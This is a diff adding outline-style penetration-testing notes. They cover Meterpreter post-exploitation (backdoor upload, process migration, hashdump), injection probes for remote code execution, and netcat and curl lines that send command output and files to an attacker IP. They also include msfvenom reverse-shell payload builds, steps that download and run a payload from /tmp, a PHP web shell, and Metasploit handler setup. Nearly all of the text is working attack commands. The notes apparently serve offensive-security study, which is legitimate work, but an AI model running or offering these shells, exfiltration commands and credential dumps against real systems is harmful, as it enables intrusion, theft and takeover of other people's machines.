+        - bind_tcp runs a server process on target machine and weaits for connections from attacker
+        - reverse_tcp performs TCP connection back to attacker machine
+        > background //Moves session to background
+        > download HaxLogs.log /root/
+        > upload /root/backdoor.exe C:\\Windows
+        > shell
+    @ Metepreter session (backdoor)
+        > background
+        - Migrate process
+            > ps -U SYSTEM //Displays only processes with system priveleges
+            - Choose process
+            > migrate 616
+        > hashdump
+- Remote Code Eexecution
+    - Usually result of different vulnerability
+        - Unrestrected file uploading, command or OS injection, sql injection, ...
+    @ Injection attempts
+        - ls
+        - <?php phpinfo();?>
+        - <script>alert(1)</script>
+        - sleep+5
+        - ping+<ATTACKER IP>+-c+5
+    - Uploads shell.php
+    $ ls /usr/bin //Shows tools
+    $ which nc, curl, python, wget
+    * Attacker
+        $ nc -lvp 53
+    * Victim
+        $ nc <ATTACKER IP> -e /bin/bash
+        $ curl http://<ATTACKER IP>:53/`whoami`
+        $ curl http://<ATTACKER IP>:53/`id|base64`
+        $ curl http://<ATTACKER IP>:53/file -T /etc/issue
+    @ Example
+        $ python -m SimpleHTTPServer 8080
+        $ msfvenom -p linux/x64/shell_reverse_tcp lhost=192.168.139.130 lport=53 -f elf -o reverse53
+        $ curl http://<ATTACKER IP>:9090/reverse53 -o /tmp/r
+        $ chmod +x /tmp/r
+        $ curl http://<ATTACKER IP>:9090 -T /tmp/r
+        $ /tmp/r
+        * Upgrade session
+            $ bash -i
+            $ python -c 'import pty; pty.spawn("/bin/sh")'
+- Shells
+    - ASP shells on Windows server
+    - JSP shells on Apache Tomcat
+    - PHP shells on Apache
+    @ PHP shell
+        <html>
+        <?php
+
+        echo "<form method=GET><input type=text name=cmd><input type=submit value=ok></form>";
+        system($_GET["cmd]);
+
+        ?>
+        </html>
+    * Pentestmonkey cheat-sheet shells
+    $ msfvenom --list payloads | grep x64 | grep linux | grep reverse
+    $ msfvenom -p linux/x64/shell/reverse_tcp lhost=192.168.0.58 lport=443 -f elf -o r443
+    $ chmod +x r443
+        > use exploit/multi/handler
+        > set payload linux/x64/shell/reverse_tcp
+        > set lhost 0.0.0.0
+        > set lport 443
+    $ msfvenom --list payloads | grep php | grep reverse
+    $ msfvenom -p php/reverse_php lhost=192.168.0.58 lport=443 -o r443.php
+        > use exploit/multi/handler
+        > set payload php/reverse_tcp
+        > set lhost 192.168.0.58
+        > set lport 443
+    * use post/multi/manage/shell_to_meterpreter
+        > set lhost 192.168.0.58
+        > set lport 8443
+    > sessions -K
+    > jobs -K
